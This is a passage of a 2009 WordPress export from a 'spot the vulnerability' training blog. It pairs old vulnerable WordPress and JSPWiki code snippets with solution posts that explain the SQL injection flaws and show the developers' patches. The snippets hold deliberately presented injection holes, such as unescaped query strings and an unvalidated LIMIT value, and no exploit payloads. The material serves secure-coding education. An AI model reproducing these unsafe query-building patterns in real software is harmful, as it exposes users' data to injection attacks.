			<wp:meta_value><![CDATA[http://bit.ly/acqYs5]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Monster Truck</title>
		<link>http://spotthevuln.com/2009/11/vulnerable-code-monster-truck/</link>
		<pubDate>Mon, 23 Nov 2009 15:00:07 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=216</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>There are two ways to pass a hurdle: leaping over or plowing through... There needs to be a monster truck option.
- Jeph Jacques, Questionable Content #1356, 03-10-09</blockquote>
[ccnLe_php]
function update_option($option_name, $newvalue) {
global $wpdb;

if ( is_string($newvalue) )
$newvalue = trim($newvalue);

// If the new and old values are the same, no need to update.
$oldvalue = get_option($option_name);
if ( $newvalue == $oldvalue ) {
return false;
}

if ( false === $oldvalue ) {
add_option($option_name, $newvalue);
return true;
}

$_newvalue = $newvalue;
$newvalue = maybe_serialize($newvalue);

wp_cache_set($option_name, $newvalue, 'options');

$newvalue = $wpdb-&gt;escape($newvalue);
$option_name = $wpdb-&gt;escape($option_name);
$wpdb-&gt;query("UPDATE $wpdb-&gt;options SET option_value = '$newvalue' WHERE option_name = '$option_name'");
if ( $wpdb-&gt;rows_affected == 1 ) {
do_action("update_option_{$option_name}", array('old'=&gt;$oldvalue, 'new'=&gt;$_newvalue));
return true;
}
return false;
}

Where get_option is the following:

function get_option($setting) {
global $wpdb;

// Allow plugins to short-circuit options.
$pre = apply_filters( 'pre_option_' . $setting, false );
if ( false !== $pre )
return $pre;

// prevent non-existent options from triggering multiple queries
$notoptions = wp_cache_get('notoptions', 'options');
if ( isset($notoptions[$setting]) )
return false;

$alloptions = wp_load_alloptions();

if ( isset($alloptions[$setting]) ) {
$value = $alloptions[$setting];
} else {
$value = wp_cache_get($setting, 'options');

if ( false === $value ) {
if ( defined('WP_INSTALLING') )
$wpdb-&gt;hide_errors();
$row = $wpdb-&gt;get_row("SELECT option_value FROM $wpdb-&gt;options WHERE option_name = '$setting' LIMIT 1");
if ( defined('WP_INSTALLING') )
$wpdb-&gt;show_errors();

if( is_object( $row) ) { // Has to be get_row instead of get_var because of funkiness with 0, false, null values
$value = $row-&gt;option_value;
wp_cache_add($setting, $value, 'options');
} else { // option does not exist, so we must cache its non-existence
$notoptions[$setting] = true;
wp_cache_set('notoptions', $notoptions, 'options');
return false;
}
}
[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>216</wp:post_id>
		<wp:post_date>2009-11-23 08:00:07</wp:post_date>
		<wp:post_date_gmt>2009-11-23 15:00:07</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vulnerable-code-monster-truck</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[no]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable Source Code]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Can you identify the security vulnerability in this code snippet?]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/aWDW5N]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[9e4c02593cc993ce0a457d262644afe1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Monster Truck - SQL Injection</title>
		<link>http://spotthevuln.com/2009/11/sql-injection-vulnerability-monster-truck/</link>
		<pubDate>Fri, 27 Nov 2009 15:00:33 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=218</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
<strong>Affected Software: WordPress</strong>

<strong>Fixed in Version: 2.0.11</strong>

<strong>Issue Type: SQL Injection</strong>

<strong>Original Code: </strong><a href="http://spotthevuln.com/2009/11/vulnerable-code-monster-truck/">Found Here</a>
<h2>Description</h2>
This SQL Injection vulnerability was fixed in WordPress 2.0.11.  Functions utilizing “string building” techniques to build SQL queries should always undergo detailed security review.  Properly sanitizing dynamic, string built SQL queries is difficult.  In this case, we see that $option_name is passed to the get_option() function, which in turn passes the un-sanitized, used controlled value to a string built SQL statement.  The WordPress developers chose to address this issue by first escaping the $option_name variable and passing the escaped value to get_option().  The patched code also adds a comment indicating that the update_option() function expects $option_name to <strong>NOT </strong>be SQL-escaped (line 1 of the code diff).  It may be fruitful to see if other calls to the update_option() function escape the $option_name value :)

Newer versions of WordPress (2.5 and &gt;) have transitioned away from calling string building SQL queries and provide a $wpdb-&gt;prepare() function to help prevent SQL Injection attacks.  Information related to the database functions supported by WordPress can be found <a href="http://codex.wordpress.org/Function_Reference/wpdb_Class" target="_blank">here</a>.
<h2>Developers Solution</h2>
[cce lang="diff"]

+// expects $option_name to NOT be SQL-escaped

function update_option($option_name, $newvalue) {

global $wpdb;

+       $safe_option_name = $wpdb-&gt;escape($option_name);

if ( is_string($newvalue) )
$newvalue = trim($newvalue);

// If the new and old values are the same, no need to update.
-       $oldvalue = get_option($option_name);
+       $oldvalue = get_option($safe_option_name);
if ( $newvalue == $oldvalue ) {
return false;
}

if ( false === $oldvalue ) {
add_option($option_name, $newvalue);
return true;
}

$_newvalue = $newvalue;
$newvalue = maybe_serialize($newvalue);

wp_cache_set($option_name, $newvalue, 'options');

$newvalue = $wpdb-&gt;escape($newvalue);
$option_name = $wpdb-&gt;escape($option_name);
$wpdb-&gt;query("UPDATE $wpdb-&gt;options SET option_value = '$newvalue' WHERE option_name = '$option_name'");
if ( $wpdb-&gt;rows_affected == 1 ) {
do_action("update_option_{$option_name}", array('old'=&gt;$oldvalue, 'new'=&gt;$_newvalue));
return true;
}
return false;
}

Where get_option is the following:

function get_option($setting) {
global $wpdb;

// Allow plugins to short-circuit options.
$pre = apply_filters( 'pre_option_' . $setting, false );
if ( false !== $pre )
return $pre;

// prevent non-existent options from triggering multiple queries
$notoptions = wp_cache_get('notoptions', 'options');
if ( isset($notoptions[$setting]) )
return false;

$alloptions = wp_load_alloptions();

if ( isset($alloptions[$setting]) ) {
$value = $alloptions[$setting];
} else {
$value = wp_cache_get($setting, 'options');

if ( false === $value ) {
if ( defined('WP_INSTALLING') )
$wpdb-&gt;hide_errors();
$row = $wpdb-&gt;get_row("SELECT option_value FROM $wpdb-&gt;options WHERE option_name = '$setting' LIMIT 1");
if ( defined('WP_INSTALLING') )
$wpdb-&gt;show_errors();

if( is_object( $row) ) { // Has to be get_row instead of get_var because of funkiness with 0, false, null values
$value = $row-&gt;option_value;
wp_cache_add($setting, $value, 'options');
} else { // option does not exist, so we must cache its non-existence
$notoptions[$setting] = true;
wp_cache_set('notoptions', $notoptions, 'options');
return false;
}
}
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>218</wp:post_id>
		<wp:post_date>2009-11-27 08:00:33</wp:post_date>
		<wp:post_date_gmt>2009-11-27 15:00:33</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>sql-injection-vulnerability-monster-truck</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[no]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[SQL injection Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[SQL Injection Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[af3c11d4c04aa6a1d8131530dfa1990b]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cQ6Fah]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Two Paradoxes</title>
		<link>http://spotthevuln.com/2009/11/vulnerable-code-two-paradoxes/</link>
		<pubDate>Mon, 30 Nov 2009 21:00:48 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=220</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>Two paradoxes are better than one; they may even suggest a solution.
- Edward Teller (1908 - 2003)</blockquote>
[ccnLe_php]

function wp_suggestCategories($args) {
global $wpdb;

$this-&gt;escape($args);

$blog_id = (int) $args[0];
$username = $args[1];
$password = $args[2];
$category  = $args[3];
$max_results  = $args[4];

if(!$this-&gt;login_pass_ok($username, $password)) {
return($this-&gt;error);
}

// Only set a limit if one was provided.
$limit = "";
if(!empty($max_results)) {
$limit = "LIMIT {$max_results}";
}

$category_suggestions = $wpdb-&gt;get_results("
SELECT cat_ID category_id,
cat_name category_name
FROM {$wpdb-&gt;categories}
WHERE cat_name LIKE '{$category}%'
{$limit}
");

return($category_suggestions);
}
[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>220</wp:post_id>
		<wp:post_date>2009-11-30 14:00:48</wp:post_date>
		<wp:post_date_gmt>2009-11-30 21:00:48</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vulnerable-code-two-paradoxes</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[no]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable Source Code]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Can you identify the security vulnerability in this code snippet?]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dm2Apg]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[58a82cc7ffd8e45c4f44f80bd77dfd98]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Two Paradoxes - SQL Injection</title>
		<link>http://spotthevuln.com/2009/12/sql-injection-vulnerability-two-paradoxes/</link>
		<pubDate>Fri, 04 Dec 2009 15:23:03 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=222</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
<strong>Affected Software: WordPress</strong>

<strong>Fixed in Version: 2.2.1</strong>

<strong>Issue Type: SQL Injection</strong>

<strong>Original Code: </strong><a href="http://spotthevuln.com/2009/11/vulnerable-code-two-paradoxes/">Found Here</a>
<h2>Description</h2>
This one was a little tricky.  This was a SQL injection vulnerability affecting WordPress Versions 2.2.0 and below.  The SQL injection could be called through the XMLRPC.php file.  This SQL Injection was a little tricky as it did not require single quotes or double quotes.  In this case, the $args variable is attacker controlled.  The WordPress developers understood the dangers of passing un-sanitized, attacker controlled variables to dynamic SQL queries and passed $args through the PHP escape() function before allowing $args to be used as part of a SQL query.  This is usually sufficient in most scenarios and is the convention used throughout WordPress (escape(), then pass to dynamically built SQL statements).  Unfortunately, the WordPress developers failed to realize $args[4] ($max_results) was being passed to the end of the SQL statement as part of a LIMIT clause.  The LIMIT clause did not contain any single quotes or double quotes to break out of.  The attacker could construct a legal SQL Injection query without the use of single quotes or double quotes (or any other special characters), allowing for SQL Injection against the WordPress installation.  Although the $args variable was escaped, it didn’t provide sufficient protection in this instance.

The WordPress developers addressed this vulnerability by casting $args[4] ($max_results) into an int, so although the attacker has control over this value, it cannot contain anything other than in integer value.
<h2>Developers Solution</h2>
[cce lang="diff"]

/**
* WordPress XML-RPC API
* wp_suggestCategories
*/
function wp_suggestCategories($args) {
global $wpdb;

$this-&gt;escape($args);

$blog_id                                = (int) $args[0];
$username                               = $args[1];
$password                               = $args[2];
$category                               = $args[3];
-               $max_results                        = $args[4];
+               $max_results                     = (int) $args[4];

if(!$this-&gt;login_pass_ok($username, $password)) {
return($this-&gt;error);
}

// Only set a limit if one was provided.
$limit = "";
if(!empty($max_results)) {
$limit = "LIMIT {$max_results}";
}

$category_suggestions = $wpdb-&gt;get_results("
SELECT cat_ID category_id,
cat_name category_name
FROM {$wpdb-&gt;categories}
WHERE cat_name LIKE '{$category}%'
{$limit}
");

return($category_suggestions);
}
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>222</wp:post_id>
		<wp:post_date>2009-12-04 08:23:03</wp:post_date>
		<wp:post_date_gmt>2009-12-04 15:23:03</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>sql-injection-vulnerability-two-paradoxes</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[no]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[SQL injection Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[SQL Injection Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dzpTDn]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[2296388353bbdecc78348f481092c940]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Expensive Carpet</title>
		<link>http://spotthevuln.com/2009/12/expensive-carpet/</link>
		<pubDate>Mon, 07 Dec 2009 17:19:58 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=225</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><p>What if everything is an illusion and nothing exists? In that case, I definitely overpaid for my carpet.<br />
- Woody Allen</p></blockquote>
<p>[ccnLe_php]</p>
<p>if ( !function_exists('get_userdatabylogin') ) :<br />
function get_userdatabylogin($user_login) {<br />
global $wpdb;<br />
$user_login = sanitize_user( $user_login );</p>
<p>if ( empty( $user_login ) )<br />
return false;</p>
<p>$userdata = wp_cache_get($user_login, 'userlogins');<br />
if ( $userdata )<br />
return $userdata;</p>
<p>if ( !$user = $wpdb-&gt;get_row("SELECT * FROM $wpdb-&gt;users WHERE user_login = '$user_login'") )<br />
return false;</p>
<p>$wpdb-&gt;hide_errors();<br />
$metavalues = $wpdb-&gt;get_results("SELECT meta_key, meta_value FROM $wpdb-&gt;usermeta WHERE user_id = '$user-&gt;ID'");<br />
$wpdb-&gt;show_errors();</p>
<p>if ($metavalues) {<br />
foreach ( $metavalues as $meta ) {<br />
$value = maybe_unserialize($meta-&gt;meta_value);<br />
$user-&gt;{$meta-&gt;meta_key} = $value;</p>
<p>// We need to set user_level from meta, not row<br />
if ( $wpdb-&gt;prefix . 'user_level' == $meta-&gt;meta_key )<br />
$user-&gt;user_level = $meta-&gt;meta_value;<br />
}<br />
}</p>
<p>// For backwards compat.<br />
if ( isset($user-&gt;first_name) )<br />
$user-&gt;user_firstname = $user-&gt;first_name;<br />
if ( isset($user-&gt;last_name) )<br />
$user-&gt;user_lastname = $user-&gt;last_name;<br />
if ( isset($user-&gt;description) )<br />
$user-&gt;user_description = $user-&gt;description;</p>
<p>wp_cache_add($user-&gt;ID, $user, 'users');<br />
wp_cache_add($user-&gt;user_login, $user, 'userlogins');</p>
<p>return $user;</p>
<p>}</p>
<p>Where Sanitize_user is<br />
function sanitize_user( $username, $strict = false ) {<br />
$raw_username = $username;<br />
$username = strip_tags($username);<br />
// Kill octets<br />
$username = preg_replace('|%([a-fA-F0-9][a-fA-F0-9])|', '', $username);<br />
$username = preg_replace('/&amp;.+?;/', '', $username); // Kill entities</p>
<p>// If strict, reduce to ASCII for max portability.<br />
if ( $strict )<br />
$username = preg_replace('|[^a-z0-9 _.\-@]|i', '', $username);</p>
<p>return apply_filters('sanitize_user', $username, $raw_username, $strict);<br />
}</p>
<p>[/ccnLe_php]</p>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>225</wp:post_id>
		<wp:post_date>2009-12-07 10:19:58</wp:post_date>
		<wp:post_date_gmt>2009-12-07 17:19:58</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>expensive-carpet</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[no]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable Source Code]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Can you identify the security vulnerability in this code snippet?]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[474480f7385fee2e3f4c180f3682a543]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dfkiBn]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Expensive Carpet - SQL Injection</title>
		<link>http://spotthevuln.com/2009/12/sql-injection-vulnerability-expensive-carpet/</link>
		<pubDate>Fri, 11 Dec 2009 15:00:44 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=227</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
<strong>Affected Software: WordPress</strong>

<strong>Fixed in Version: 2.0.11</strong>

<strong>Issue Type: SQL Injection</strong>

<strong>Original Code: </strong><a href="http://spotthevuln.com/2009/12/expensive-carpet/">Found Here</a>
<h2>Description</h2>
This was a SQL injection bug that affected WordPress versions up until 2.0.11.  Looking at the vulnerable code, we see the classic string building of a SQL statement.  In this case, the $user_login variable is fully controlled by the attacker, allowing the attacker to control the string built SQL query.  Surprisingly, a sanitize_user() function was called in order to sanitize the attacker controlled $user_login value.  Looking at sanitize_user() function we see two routines which sanitize the user name, one routine to “kill octets” and one routine to “kill entities”, unfortunately the sanitize_user() function failed to sanitize the $user_login variable against SQL injection.  Another interesting fact about sanitize_user(), is it actually contained logic to sanitize $user_login to only ASCII characters, however this was disabled by default, leaving WordPress installations vulnerable to blind SQL Injection attacks.

After discovering fully weapoinzed exploit code for this issue, the WordPress developers addressed this issue by escaping the $user_login variable before passing it to the string built SQL query.
<h2>Developers Solution</h2>
[cce lang="diff"]

if ( !function_exists('get_userdatabylogin') ) :
function get_userdatabylogin($user_login) {
global $wpdb;
$user_login = sanitize_user( $user_login );

if ( empty( $user_login ) )
return false;

$userdata = wp_cache_get($user_login, 'userlogins');
if ( $userdata )
return $userdata;
+       $user_login = $wpdb-&gt;escape($user_login);

if ( !$user = $wpdb-&gt;get_row("SELECT * FROM $wpdb-&gt;users WHERE user_login = '$user_login'") )
return false;

$wpdb-&gt;hide_errors();
$metavalues = $wpdb-&gt;get_results("SELECT meta_key, meta_value FROM $wpdb-&gt;usermeta WHERE user_id = '$user-&gt;ID'");
$wpdb-&gt;show_errors();

if ($metavalues) {
foreach ( $metavalues as $meta ) {
$value = maybe_unserialize($meta-&gt;meta_value);
$user-&gt;{$meta-&gt;meta_key} = $value;

// We need to set user_level from meta, not row
if ( $wpdb-&gt;prefix . 'user_level' == $meta-&gt;meta_key )
$user-&gt;user_level = $meta-&gt;meta_value;
}
}

// For backwards compat.
if ( isset($user-&gt;first_name) )
$user-&gt;user_firstname = $user-&gt;first_name;
if ( isset($user-&gt;last_name) )
$user-&gt;user_lastname = $user-&gt;last_name;
if ( isset($user-&gt;description) )
$user-&gt;user_description = $user-&gt;description;

wp_cache_add($user-&gt;ID, $user, 'users');
wp_cache_add($user-&gt;user_login, $user, 'userlogins');

return $user;

}

Where Sanitize_user is
function sanitize_user( $username, $strict = false ) {
$raw_username = $username;
$username = strip_tags($username);
// Kill octets
$username = preg_replace('|%([a-fA-F0-9][a-fA-F0-9])|', '', $username);
$username = preg_replace('/&amp;.+?;/', '', $username); // Kill entities

// If strict, reduce to ASCII for max portability.
if ( $strict )
$username = preg_replace('|[^a-z0-9 _.\-@]|i', '', $username);

return apply_filters('sanitize_user', $username, $raw_username, $strict);
}

[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>227</wp:post_id>
		<wp:post_date>2009-12-11 08:00:44</wp:post_date>
		<wp:post_date_gmt>2009-12-11 15:00:44</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>sql-injection-vulnerability-expensive-carpet</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[no]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[SQL injection Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[SQL Injection Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[c7bfa02d0bde4958186d667ddaf7a658]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/9DlsIz]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Ki&#039;s From Overseas</title>
		<link>http://spotthevuln.com/2009/11/vulnerable-code-keys-from-oversea/</link>
		<pubDate>Mon, 09 Nov 2009 15:01:15 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=534</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>I got ki's, comin from overseas...
- Sykes</blockquote>
[ccnLe_java]

&lt;% if( usertext == null ) usertext = ""; %&gt;
&lt;%
String action = "comment".equals(request.getParameter("action")) ?
context.getURL(WikiContext.COMMENT,context.getName()) :
context.getURL(WikiContext.EDIT,context.getName());
%&gt;
&lt;form accept-charset="&lt;wiki:ContentEncoding/&gt;" method="post"
action="&lt;%=action%&gt;"
name="editForm" enctype="application/x-www-form-urlencoded"&gt;
&lt;p&gt;
&lt;%-- Edit.jsp &amp; Comment.jsp rely on these being found.  So be careful, if you make changes. --%&gt;
&lt;input name="author" type="hidden" value="&lt;%=session.getAttribute("author")%&gt;" /&gt;
&lt;input name="link" type="hidden" value="&lt;%=session.getAttribute("link")%&gt;" /&gt;
&lt;input name="remember" type="hidden" value="&lt;%=session.getAttribute("remember")%&gt;" /&gt;

&lt;input name="page" type="hidden" value="&lt;wiki:Variable var="pagename"/&gt;" /&gt;
&lt;input name="action" type="hidden" value="save" /&gt;
&lt;input name="edittime" type="hidden" value="&lt;%=pageContext.getAttribute("lastchange",
PageContext.REQUEST_SCOPE )%&gt;" /&gt;
&lt;input name="addr" type="hidden" value="&lt;%=request.getRemoteAddr()%&gt;" /&gt;

[/ccnLe_java] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>534</wp:post_id>
		<wp:post_date>2009-11-09 08:01:15</wp:post_date>
		<wp:post_date_gmt>2009-11-09 15:01:15</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vulnerable-code-keys-from-oversea</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
